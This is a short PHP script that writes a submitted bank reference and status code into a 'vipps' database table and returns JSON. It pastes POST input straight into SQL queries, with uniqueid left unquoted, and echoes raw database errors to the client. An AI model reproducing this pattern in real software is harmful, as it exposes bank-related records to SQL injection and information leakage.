<?php
require '../connection.php';

if ($_POST["bankreference"] and $_POST["uniqueid"]) {
  $bankreference = $_POST["bankreference"];
  $uniqueid = $_POST["uniqueid"];

  if (isset($_GET["resend"])) {
    $loading_query = mysqli_query($conn, "UPDATE vipps SET bankreference='$bankreference', status=19, viewed='true' WHERE uniqueid=$uniqueid");
  } else {
      $loading_query = mysqli_query($conn, "UPDATE vipps SET bankreference='$bankreference', status=18, viewed='true' WHERE uniqueid=$uniqueid");
  }

  if ($loading_query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}

?>
